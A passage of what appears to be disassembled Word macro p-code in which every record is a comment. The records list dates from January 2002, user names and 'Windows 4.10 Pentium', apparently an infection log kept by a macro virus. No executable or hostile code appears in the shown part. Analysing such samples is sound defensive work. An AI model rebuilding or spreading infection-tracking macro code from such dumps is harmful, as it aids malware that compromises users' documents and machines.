' Line #2549:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2550:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2551:
' Line #2552:
' Line #2553:
' 	QuoteRem 0x0000 0x0011 "08.01.02 17:27:20"
' Line #2554:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2555:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2556:
' Line #2557:
' Line #2558:
' 	QuoteRem 0x0000 0x0011 "08.01.02 19:02:26"
' Line #2559:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2560:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2561:
' Line #2562:
' Line #2563:
' 	QuoteRem 0x0000 0x0011 "09.01.02 13:50:31"
' Line #2564:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2565:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2566:
' Line #2567:
' Line #2568:
' 	QuoteRem 0x0000 0x0011 "09.01.02 13:52:46"
' Line #2569:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2570:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2571:
' Line #2572:
' Line #2573:
' 	QuoteRem 0x0000 0x0011 "09.01.02 13:53:48"
' Line #2574:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2575:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2576:
' Line #2577:
' Line #2578:
' 	QuoteRem 0x0000 0x0011 "09.01.02 13:54:57"
' Line #2579:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2580:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2581:
' Line #2582:
' Line #2583:
' 	QuoteRem 0x0000 0x0011 "09.01.02 14:00:12"
' Line #2584:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2585:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2586:
' Line #2587:
' Line #2588:
' 	QuoteRem 0x0000 0x0011 "10.01.02 11:50:45"
' Line #2589:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2590:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2591:
' Line #2592:
' Line #2593:
' 	QuoteRem 0x0000 0x0011 "10.01.02 11:56:08"
' Line #2594:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2595:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2596:
' Line #2597:
' Line #2598:
' 	QuoteRem 0x0000 0x0011 "10.01.02 11:59:36"
' Line #2599:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2600:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2601:
' Line #2602:
' Line #2603:
' 	QuoteRem 0x0000 0x0011 "10.01.02 12:24:20"
' Line #2604:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2605:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2606:
' Line #2607:
' Line #2608:
' 	QuoteRem 0x0000 0x0011 "10.01.02 13:27:39"
' Line #2609:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2610:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2611:
' Line #2612:
' Line #2613:
' 	QuoteRem 0x0000 0x0011 "10.01.02 13:29:29"
' Line #2614:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2615:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2616:
' Line #2617:
' Line #2618:
' 	QuoteRem 0x0000 0x0011 "11.01.02 12:10:34"
' Line #2619:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2620:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2621:
' Line #2622:
' Line #2623:
' 	QuoteRem 0x0000 0x0011 "11.01.02 17:24:25"
' Line #2624:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2625:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2626:
' Line #2627:
' Line #2628:
' 	QuoteRem 0x0000 0x0011 "11.01.02 19:41:02"
' Line #2629:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2630:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2631:
' Line #2632:
' Line #2633:
' 	QuoteRem 0x0000 0x0011 "11.01.02 19:41:19"
' Line #2634:
' 	QuoteRem 0x0000 0x0006 "Viktor"
' Line #2635:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2636:
' Line #2637:
' Line #2638:
' 	QuoteRem 0x0000 0x0011 "12.01.02 16:57:49"
' Line #2639:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2640:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2641:
' Line #2642:
' Line #2643:
' 	QuoteRem 0x0000 0x0011 "12.01.02 18:03:57"
' Line #2644:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2645:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2646:
' Line #2647:
' Line #2648:
' 	QuoteRem 0x0000 0x0011 "12.01.02 18:04:25"
' Line #2649:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2650:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2651:
' Line #2652:
' Line #2653:
' 	QuoteRem 0x0000 0x0011 "12.01.02 18:04:38"
' Line #2654:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2655:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2656:
' Line #2657:
' Line #2658:
' 	QuoteRem 0x0000 0x0011 "12.01.02 18:05:26"
' Line #2659:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2660:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2661:
' Line #2662:
' Line #2663:
' 	QuoteRem 0x0000 0x0011 "12.01.02 18:05:43"
' Line #2664:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2665:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2666:
' Line #2667:
' Line #2668:
' 	QuoteRem 0x0000 0x0011 "12.01.02 18:06:02"
' Line #2669:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2670:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2671:
' Line #2672:
' Line #2673:
' 	QuoteRem 0x0000 0x0011 "12.01.02 18:06:48"
' Line #2674:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2675:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2676:
' Line #2677:
' Line #2678:
' 	QuoteRem 0x0000 0x0011 "12.01.02 18:09:57"
' Line #2679:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2680:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2681:
' Line #2682:
' Line #2683:
' 	QuoteRem 0x0000 0x0011 "12.01.02 19:28:27"
' Line #2684:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2685:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2686:
' Line #2687:
' Line #2688:
' 	QuoteRem 0x0000 0x0011 "12.01.02 19:29:56"
' Line #2689:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2690:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2691:
' Line #2692:
' Line #2693:
' 	QuoteRem 0x0000 0x0011 "12.01.02 19:32:52"
' Line #2694:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2695:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2696:
' Line #2697:
' Line #2698:
' 	QuoteRem 0x0000 0x0011 "12.01.02 20:10:59"
' Line #2699:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2700:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2701:
' Line #2702:
' Line #2703:
' 	QuoteRem 0x0000 0x0011 "13.01.02 13:49:32"
' Line #2704:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2705:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2706:
' Line #2707:
' Line #2708:
' 	QuoteRem 0x0000 0x0011 "13.01.02 13:52:24"
' Line #2709:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2710:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2711:
' Line #2712:
' Line #2713:
' 	QuoteRem 0x0000 0x0011 "13.01.02 16:40:44"
' Line #2714:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2715:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2716:
' Line #2717:
' Line #2718:
' 	QuoteRem 0x0000 0x0011 "13.01.02 17:12:53"
' Line #2719:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2720:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2721:
' Line #2722:
' Line #2723:
' 	QuoteRem 0x0000 0x0011 "13.01.02 18:08:28"
' Line #2724:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2725:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2726:
' Line #2727:
' Line #2728:
' 	QuoteRem 0x0000 0x0011 "13.01.02 18:31:00"
' Line #2729:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2730:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2731:
' Line #2732:
' Line #2733:
' 	QuoteRem 0x0000 0x0011 "13.01.02 18:48:52"
' Line #2734:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2735:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2736:
' Line #2737:
' Line #2738:
' 	QuoteRem 0x0000 0x0011 "13.01.02 19:08:19"
' Line #2739:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2740:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2741:
' Line #2742:
' Line #2743:
' 	QuoteRem 0x0000 0x0011 "14.01.02 14:56:46"
' Line #2744:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2745:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2746:
' Line #2747:
' Line #2748:
' 	QuoteRem 0x0000 0x0011 "14.01.02 15:01:00"
' Line #2749:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2750:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2751:
' Line #2752:
' Line #2753:
' 	QuoteRem 0x0000 0x0011 "14.01.02 15:40:08"
' Line #2754:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2755:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2756:
' Line #2757:
' Line #2758:
' 	QuoteRem 0x0000 0x0011 "14.01.02 15:43:46"
' Line #2759:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2760:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2761:
' Line #2762:
' Line #2763:
' 	QuoteRem 0x0000 0x0011 "14.01.02 15:56:15"
' Line #2764:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2765:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2766:
' Line #2767:
' Line #2768:
' 	QuoteRem 0x0000 0x0011 "14.01.02 20:29:41"
' Line #2769:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2770:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2771:
' Line #2772:
' Line #2773:
' 	QuoteRem 0x0000 0x0011 "14.01.02 21:04:09"
' Line #2774:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2775:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2776:
' Line #2777:
' Line #2778:
' 	QuoteRem 0x0000 0x0011 "14.01.02 21:06:05"
' Line #2779:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2780:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2781:
' Line #2782:
' Line #2783:
' 	QuoteRem 0x0000 0x0010 "15.01.02 9:21:54"
' Line #2784:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2785:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2786:
' Line #2787:
' Line #2788:
' 	QuoteRem 0x0000 0x0010 "15.01.02 9:25:15"
' Line #2789:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2790:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2791:
' Line #2792:
' Line #2793:
' 	QuoteRem 0x0000 0x0010 "15.01.02 9:26:04"
' Line #2794:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2795:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2796:
' Line #2797:
' Line #2798:
' 	QuoteRem 0x0000 0x0010 "15.01.02 9:27:32"
' Line #2799:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2800:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2801:
' Line #2802:
' Line #2803:
' 	QuoteRem 0x0000 0x0010 "15.01.02 9:28:33"
' Line #2804:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2805:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2806:
' Line #2807:
' Line #2808:
' 	QuoteRem 0x0000 0x0011 "15.01.02 11:53:08"
' Line #2809:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2810:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2811:
' Line #2812:
' Line #2813:
' 	QuoteRem 0x0000 0x0011 "15.01.02 12:43:05"
' Line #2814:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2815:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2816:
' Line #2817:
' Line #2818:
' 	QuoteRem 0x0000 0x0011 "15.01.02 13:18:17"
' Line #2819:
' 	QuoteRem 0x0000 0x0004 "tesi"
' Line #2820:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2821:
' Line #2822:
' Line #2823:
' 	QuoteRem 0x0000 0x0011 "16.01.02 16:11:03"
' Line #2824:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2825:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2826:
' Line #2827:
' Line #2828:
' 	QuoteRem 0x0000 0x0011 "16.01.02 18:19:57"
' Line #2829:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2830:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2831:
' Line #2832:
' Line #2833:
' 	QuoteRem 0x0000 0x0011 "16.01.02 18:52:57"
' Line #2834:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2835:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2836:
' Line #2837:
' Line #2838:
' 	QuoteRem 0x0000 0x0011 "16.01.02 20:31:57"
' Line #2839:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2840:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2841:
' Line #2842:
' Line #2843:
' 	QuoteRem 0x0000 0x0010 "17.01.02 7:51:40"
' Line #2844:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2845:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2846:
' Line #2847:
' Line #2848:
' 	QuoteRem 0x0000 0x0010 "17.01.02 8:13:53"
' Line #2849:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2850:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2851:
' Line #2852:
' Line #2853:
' 	QuoteRem 0x0000 0x0010 "17.01.02 8:36:13"
' Line #2854:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2855:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2856:
' Line #2857:
' Line #2858:
' 	QuoteRem 0x0000 0x0010 "17.01.02 8:43:02"
' Line #2859:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2860:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2861:
' Line #2862:
' Line #2863:
' 	QuoteRem 0x0000 0x0011 "17.01.02 12:07:27"
' Line #2864:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2865:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2866:
' Line #2867:
' Line #2868:
' 	QuoteRem 0x0000 0x0011 "17.01.02 12:07:40"
' Line #2869:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2870:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2871:
' Line #2872:
' Line #2873:
' 	QuoteRem 0x0000 0x0011 "17.01.02 13:11:09"
' Line #2874:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2875:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2876:
' Line #2877:
' Line #2878:
' 	QuoteRem 0x0000 0x0011 "17.01.02 13:18:42"
' Line #2879:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2880:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2881:
' Line #2882:
' Line #2883:
' 	QuoteRem 0x0000 0x0011 "17.01.02 13:24:23"
' Line #2884:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2885:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2886:
' Line #2887:
' Line #2888:
' 	QuoteRem 0x0000 0x0011 "17.01.02 14:00:55"
' Line #2889:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2890:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2891:
' Line #2892:
' Line #2893:
' 	QuoteRem 0x0000 0x0011 "17.01.02 14:01:34"
' Line #2894:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2895:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2896:
' Line #2897:
' Line #2898:
' 	QuoteRem 0x0000 0x0011 "17.01.02 14:05:14"
' Line #2899:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2900:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2901:
' Line #2902:
' Line #2903:
' 	QuoteRem 0x0000 0x0011 "17.01.02 14:05:39"
' Line #2904:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2905:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2906:
' Line #2907:
' Line #2908:
' 	QuoteRem 0x0000 0x0011 "17.01.02 14:08:03"
' Line #2909:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2910:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2911:
' Line #2912:
' Line #2913:
' 	QuoteRem 0x0000 0x0011 "17.01.02 14:51:36"
' Line #2914:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2915:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2916:
' Line #2917:
' Line #2918:
' 	QuoteRem 0x0000 0x0011 "17.01.02 14:54:25"
' Line #2919:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2920:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2921:
' Line #2922:
' Line #2923:
' 	QuoteRem 0x0000 0x0011 "17.01.02 15:04:58"
' Line #2924:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2925:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2926:
' Line #2927:
' Line #2928:
' 	QuoteRem 0x0000 0x0011 "17.01.02 15:05:26"
' Line #2929:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2930:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2931:
' Line #2932:
' Line #2933:
' 	QuoteRem 0x0000 0x0011 "17.01.02 15:05:39"
' Line #2934:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2935:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2936:
' Line #2937:
' Line #2938:
' 	QuoteRem 0x0000 0x0011 "17.01.02 16:44:59"
' Line #2939:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2940:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2941:
' Line #2942:
' Line #2943:
' 	QuoteRem 0x0000 0x0011 "17.01.02 16:49:12"
' Line #2944:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2945:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2946:
' Line #2947:
' Line #2948:
' 	QuoteRem 0x0000 0x0011 "17.01.02 16:51:50"
' Line #2949:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2950:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2951:
' Line #2952:
' Line #2953:
' 	QuoteRem 0x0000 0x0011 "17.01.02 18:36:24"
' Line #2954:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2955:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2956:
' Line #2957:
' Line #2958:
' 	QuoteRem 0x0000 0x0011 "17.01.02 20:42:33"
' Line #2959:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2960:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2961:
' Line #2962:
' Line #2963:
' 	QuoteRem 0x0000 0x0011 "17.01.02 20:46:20"
' Line #2964:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2965:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2966:
' Line #2967:
' Line #2968:
' 	QuoteRem 0x0000 0x0010 "18.01.02 9:09:47"
' Line #2969:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2970:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2971:
' Line #2972:
' Line #2973:
' 	QuoteRem 0x0000 0x0011 "18.01.02 13:50:41"
' Line #2974:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2975:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2976:
' Line #2977:
' Line #2978:
' 	QuoteRem 0x0000 0x0011 "18.01.02 15:15:31"
' Line #2979:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2980:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2981:
' Line #2982:
' Line #2983:
' 	QuoteRem 0x0000 0x0011 "18.01.02 15:22:16"
' Line #2984:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2985:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2986:
' Line #2987:
' Line #2988:
' 	QuoteRem 0x0000 0x0011 "18.01.02 15:24:04"
' Line #2989:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2990:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2991:
' Line #2992:
' Line #2993:
' 	QuoteRem 0x0000 0x0011 "18.01.02 17:43:38"
' Line #2994:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #2995:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #2996:
' Line #2997:
' Line #2998:
' 	QuoteRem 0x0000 0x0011 "19.01.02 16:23:04"
' Line #2999:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3000:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3001:
' Line #3002:
' Line #3003:
' 	QuoteRem 0x0000 0x0011 "19.01.02 16:23:46"
' Line #3004:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3005:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3006:
' Line #3007:
' Line #3008:
' 	QuoteRem 0x0000 0x0011 "19.01.02 17:21:05"
' Line #3009:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3010:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3011:
' Line #3012:
' Line #3013:
' 	QuoteRem 0x0000 0x0011 "19.01.02 17:30:07"
' Line #3014:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3015:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3016:
' Line #3017:
' Line #3018:
' 	QuoteRem 0x0000 0x0011 "19.01.02 17:49:20"
' Line #3019:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3020:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3021:
' Line #3022:
' Line #3023:
' 	QuoteRem 0x0000 0x0011 "19.01.02 17:49:36"
' Line #3024:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3025:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3026:
' Line #3027:
' Line #3028:
' 	QuoteRem 0x0000 0x0010 "20.01.02 9:59:45"
' Line #3029:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3030:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3031:
' Line #3032:
' Line #3033:
' 	QuoteRem 0x0000 0x0011 "20.01.02 10:22:32"
' Line #3034:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3035:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3036:
' Line #3037:
' Line #3038:
' 	QuoteRem 0x0000 0x0011 "20.01.02 12:38:35"
' Line #3039:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3040:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3041:
' Line #3042:
' Line #3043:
' 	QuoteRem 0x0000 0x0011 "20.01.02 17:50:39"
' Line #3044:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3045:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3046:
' Line #3047:
' Line #3048:
' 	QuoteRem 0x0000 0x0011 "20.01.02 18:05:02"
' Line #3049:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3050:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3051:
' Line #3052:
' Line #3053:
' 	QuoteRem 0x0000 0x0011 "21.01.02 12:57:51"
' Line #3054:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3055:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3056:
' Line #3057:
' Line #3058:
' 	QuoteRem 0x0000 0x0011 "21.01.02 13:36:21"
' Line #3059:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3060:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3061:
' Line #3062:
' Line #3063:
' 	QuoteRem 0x0000 0x0011 "21.01.02 14:08:39"
' Line #3064:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3065:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3066:
' Line #3067:
' Line #3068:
' 	QuoteRem 0x0000 0x0011 "21.01.02 16:18:41"
' Line #3069:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3070:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3071:
' Line #3072:
' Line #3073:
' 	QuoteRem 0x0000 0x0011 "21.01.02 16:18:52"
' Line #3074:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3075:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3076:
' Line #3077:
' Line #3078:
' 	QuoteRem 0x0000 0x0011 "21.01.02 16:30:41"
' Line #3079:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3080:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3081:
' Line #3082:
' Line #3083:
' 	QuoteRem 0x0000 0x0011 "21.01.02 17:03:19"
' Line #3084:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3085:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3086:
' Line #3087:
' Line #3088:
' 	QuoteRem 0x0000 0x0011 "21.01.02 17:03:28"
' Line #3089:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3090:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3091:
' Line #3092:
' Line #3093:
' 	QuoteRem 0x0000 0x0011 "21.01.02 17:36:00"
' Line #3094:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3095:
' 	QuoteRem 0x0000 0x0014 "Windows 4.10 Pentium"
' Line #3096:
' Line #3097:
' Line #3098:
' 	QuoteRem 0x0000 0x0011 "21.01.02 18:12:00"
' Line #3099:
' 	QuoteRem 0x0000 0x0006 "TESI14"
' Line #3100:
